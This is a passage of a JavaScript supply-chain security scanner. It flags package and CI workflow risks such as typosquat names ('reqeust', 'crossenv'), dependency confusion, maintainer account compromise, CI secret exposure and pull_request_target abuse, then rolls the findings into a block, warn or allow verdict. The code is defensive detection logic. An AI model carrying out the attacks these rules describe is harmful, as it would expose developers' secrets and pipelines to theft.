        patternId: 'install-time-execution',
        severity: 'medium',
        policyImpact: 'warn',
        confidence: 0.8,
        evidence: [
          { label: 'Install Script', value: 'Lifecycle setup execution detected' }
        ]
      });
    }
  }

  // 3. Hidden Dependency Injection
  // Fires when a release adds a new direct or transitive dependency that
  // the consumer did not previously trust. Caller provides
  // row.hiddenDependency = { newDep, reason } when a lockfile diff is
  // available. mockAxios stays as a sandbox trigger for the demo.
  if (mockAxios || (row.hiddenDependency && row.hiddenDependency.newDep)) {
    const newDep = row.hiddenDependency ? row.hiddenDependency.newDep : 'plain-crypto-js';
    const reason = row.hiddenDependency ? row.hiddenDependency.reason : 'Introduced 1 new unverified sub-dependency';
    patterns.push({
      patternId: 'hidden-dependency-injection',
      severity: 'high',
      policyImpact: 'warn',
      confidence: 0.88,
      evidence: [
        { label: 'Suspicious dependency', value: newDep },
        { label: 'Delta', value: reason }
      ]
    });
  }

  // 4. Typosquat / Lookalike
  if (row.possibleTypoSquat || name === 'reqeust' || name === 'crossenv') {
    patterns.push({
      patternId: 'lookalike-package-injection',
      severity: 'high',
      policyImpact: 'block',
      confidence: 0.9,
      evidence: [
        { label: 'Similarity Signal', value: (row.possibleTypoSquat && row.possibleTypoSquat.reason) || 'Lookalike spelling matches popular package' }
      ]
    });
  }

  // 5. Dependency Confusion Risk
  if (row.dependencyConfusion || demoInternalPayments) {
    const isHigh = row.dependencyConfusion && row.dependencyConfusion.confidence === 'HIGH';
    patterns.push({
      patternId: 'dependency-confusion-risk',
      severity: isHigh ? 'high' : 'medium',
      policyImpact: isHigh ? 'block' : 'warn',
      confidence: isHigh ? 0.95 : 0.75,
      evidence: [
        { label: 'Squat Confidence', value: isHigh ? 'HIGH' : 'MEDIUM' },
        { label: 'Registry Check', value: (row.dependencyConfusion && row.dependencyConfusion.reason) || 'Internal name shadowing public package namespace' }
      ]
    });
  }

  // 6. Source Package Mismatch
  if (row.verified === false || row.verified === 'unverified' || row.mismatchReason || mockAxios) {
    patterns.push({
      patternId: 'source-package-mismatch',
      severity: 'high',
      policyImpact: 'warn',
      confidence: 0.85,
      evidence: [
        { label: 'Integrity Check', value: row.mismatchReason || 'Tarball content differs from GitHub source history' }
      ]
    });
  }

  // 7. Fresh Release Cooldown Violation
  if (mockAxios || (row.publishAgeHours && row.publishAgeHours < 72)) {
    patterns.push({
      patternId: 'fresh-release-cooldown-violation',
      severity: 'medium',
      policyImpact: 'warn',
      confidence: 0.85,
      evidence: [
        { label: 'Version Age', value: row.publishAgeHours ? `${row.publishAgeHours} hours` : '3 hours' }
      ]
    });
  }

  // 8. Maintainer compromise signal
  // Fires when an upstream signal indicates the publishing account has
  // changed hands (new maintainer, former employee credential, phishing
  // disclosure). Caller provides row.maintainerCompromise = true or an
  // object with a reason. mockAxios stays as a sandbox trigger.
  if (mockAxios || row.maintainerCompromise) {
    const reason = typeof row.maintainerCompromise === 'object' && row.maintainerCompromise && row.maintainerCompromise.reason
      ? row.maintainerCompromise.reason
      : 'Unusual publisher account change detected';
    patterns.push({
      patternId: 'maintainer-account-compromise-signal',
      severity: 'high',
      policyImpact: 'warn',
      confidence: 0.82,
      evidence: [
        { label: 'Publisher Account', value: reason }
      ]
    });
  }
  // 8b. Trusted publishing bypass — sandbox-only for now.
  if (mockAxios) {
    patterns.push({
      patternId: 'trusted-publishing-bypass',
      severity: 'high',
      policyImpact: 'warn',
      confidence: 0.84,
      evidence: [
        { label: 'Publishing Seam', value: 'Release manual upload bypassed OIDC workflow tag' }
      ]
    });
  }

  // 9. CI Secret Exposure Path
  const isCiWithSecrets = context.ci === true && context.hasSecrets === true;
  if (
    (isCiWithSecrets && row.hasInstallScript === true) ||
    (isCiWithSecrets && mockAxios) ||
    (isCiWithSecrets && row.isWorkflowAction === true && row.hasSecretsAccess === true)
  ) {
    patterns.push({
      patternId: 'ci-secret-exposure-path',
      severity: 'critical',
      policyImpact: 'block',
      confidence: 0.9,
      evidence: [
        { label: 'Execution Context', value: 'CI runner job equipped with environment secrets' }
      ]
    });
  }

  // 10. High Blast Radius
  if (row.blastRadius && row.blastRadius.tier === 'high') {
    patterns.push({
      patternId: 'high-blast-radius',
      severity: 'high',
      policyImpact: 'warn',
      confidence: 0.8,
      evidence: [
        { label: 'Blast Radius Tier', value: 'HIGH' },
        { label: 'Dependent Count', value: row.blastRadius.reason || 'High downstream dependent references' }
      ]
    });
  }

  // 11. Unknown Remote Endpoint
  // Generic trigger: a package or its runtime loader contacts a third-party
  // origin that has not been pre-trusted (CDN runtime loading, telemetry
  // beacon, install-time download). Caller provides
  // row.unknownRemoteEndpoint = { host, reason } when such a signal exists.
  if (row.unknownRemoteEndpoint && row.unknownRemoteEndpoint.host) {
    patterns.push({
      patternId: 'unknown-remote-endpoint',
      severity: 'high',
      policyImpact: 'warn',
      confidence: 0.78,
      evidence: [
        { label: 'Endpoint', value: row.unknownRemoteEndpoint.host },
        { label: 'Context', value: row.unknownRemoteEndpoint.reason || 'Runtime contact with non-pre-trusted origin' }
      ]
    });
  }

  // 12. Mutable CI Tag Drift
  if (row.isWorkflowAction === true && row.tagDrift === true) {
    patterns.push({
      patternId: 'mutable-ci-tag-drift',
      severity: 'medium',
      policyImpact: 'warn',
      confidence: 0.85,
      evidence: [
        { label: 'Workflow Action', value: row.package || 'unnamed-action' },
        { label: 'Version Ref', value: row.version || 'mutable tag' },
        { label: 'Drift Signal', value: 'Tag points to mutable release tag, not immutable SHA' }
      ]
    });
  }

  // 13. Unpinned Action Reference
  if (row.isWorkflowAction === true && row.unpinnedReference === true) {
    patterns.push({
      patternId: 'unpinned-action-reference',
      severity: 'low',
      policyImpact: 'warn',
      confidence: 0.8,
      evidence: [
        { label: 'Workflow Action', value: row.package || 'unnamed-action' },
        { label: 'Reference Hook', value: 'Action references branch head or unpinned version' }
      ]
    });
  }

  // 14. Third-Party Action with Secrets Access
  if (row.isWorkflowAction === true && row.hasSecretsAccess === true && row.publisherVerified === false) {
    patterns.push({
      patternId: 'third-party-action-with-secrets',
      severity: 'medium',
      policyImpact: 'warn',
      confidence: 0.82,
      evidence: [
        { label: 'Workflow Action', value: row.package || 'unnamed-action' },
        { label: 'Access Level', value: 'Direct access to workflow secrets' },
        { label: 'Publisher Status', value: 'Unverified GitHub Action publisher' }
      ]
    });
  }

  // 15. Publisher Identity Drift
  if (row.publisherIdentityDrift && row.publisherIdentityDrift.drifted === true) {
    patterns.push({
      patternId: 'publisher-identity-drift',
      severity: 'medium',
      policyImpact: 'warn',
      confidence: 0.8,
      evidence: [
        { label: 'Publisher Domain', value: row.package || 'unnamed-publisher' },
        { label: 'Identity Status', value: row.publisherIdentityDrift.reason || 'Domain owner change or publisher namespace drift' }
      ]
    });
  }

  // 16. Pull Request Target Abuse — workflow uses pull_request_target
  // trigger AND either checks out / executes fork-controlled PR content.
  // Signal comes from src/shared/githubWorkflowSignals.js parser.
  if (row.isWorkflowAction === true && row.pullRequestTargetAbuse === true) {
    patterns.push({
      patternId: 'pull-request-target-abuse',
      severity: 'critical',
      policyImpact: 'block',
      confidence: 0.9,
      evidence: [
        { label: 'Workflow', value: row.workflowPath || row.package || 'workflow.yml' },
        { label: 'Trigger', value: 'pull_request_target' },
        { label: 'Risk', value: 'Workflow runs fork-controlled code under the privileged pull_request_target token' },
        ...(row.evidenceText ? [{ label: 'Offending Step', value: String(row.evidenceText).slice(0, 200) }] : []),
      ]
    });
  }

  // 17. Untrusted Workflow Input — run step interpolates an
  // attacker-controllable github.event field directly into the shell.
  // The fix pattern (env-var indirection) is recognized by the parser
  // and never produces this row.
  if (row.isWorkflowAction === true && row.untrustedWorkflowInput === true) {
    patterns.push({
      patternId: 'untrusted-workflow-input',
      severity: 'high',
      policyImpact: 'block',
      confidence: 0.86,
      evidence: [
        { label: 'Workflow', value: row.workflowPath || row.package || 'workflow.yml' },
        { label: 'Input Source', value: 'github.event / PR / issue context interpolated into run script' },
        ...(row.evidenceText ? [{ label: 'Offending Expression', value: String(row.evidenceText).slice(0, 200) }] : []),
      ]
    });
  }

  // 18. Dangerous Release Permission — workflow holds a write-level
  // scope that lets it ship code/artifacts. Catalog default is WARN
  // (not BLOCK) because legitimate release workflows need these;
  // combine with pull-request-target-abuse or untrusted-workflow-input
  // for the real blocking decision (those patterns already do BLOCK).
  if (row.isWorkflowAction === true && row.dangerousReleasePermission === true) {
    patterns.push({
      patternId: 'dangerous-release-permission',
      severity: 'high',
      policyImpact: 'warn',
      confidence: 0.84,
      evidence: [
        { label: 'Workflow', value: row.workflowPath || row.package || 'workflow.yml' },
        { label: 'Write Scopes', value: Array.isArray(row.writeScopes) && row.writeScopes.length > 0 ? row.writeScopes.join(', ') : 'write-level scope detected' },
      ]
    });
  }

  // Deduplicate patterns by patternId
  const seen = new Set();
  const deduped = [];
  for (const p of patterns) {
    if (!seen.has(p.patternId)) {
      seen.add(p.patternId);
      deduped.push(p);
    }
  }

  return deduped;
}

/**
 * Scan pipeline hook to attach OTS pattern checks to all matching vulnerability and health rows.
 */
export function attachOtsPatternsToRows(rows, context = {}) {
  if (!Array.isArray(rows)) return [];
  return rows.map((row) => {
    const patterns = detectOtsPatternsForRow(row, context);
    return {
      ...row,
      otsPatterns: patterns
    };
  });
}

/**
 * Resolves the aggregated verdict based on detected patterns.
 * BLOCK if any critical severity or block policy impact exists.
 * WARN if any high or medium severity exists.
 * ALLOW otherwise.
 */
export function otsPatternVerdict(patterns) {
  if (!Array.isArray(patterns) || patterns.length === 0) return 'ALLOW';
  if (patterns.some((p) => p.policyImpact === 'block' || p.severity === 'critical')) return 'BLOCK';
  if (patterns.some((p) => p.policyImpact === 'warn' || p.severity === 'high' || p.severity === 'medium')) return 'WARN';
  return 'ALLOW';
}
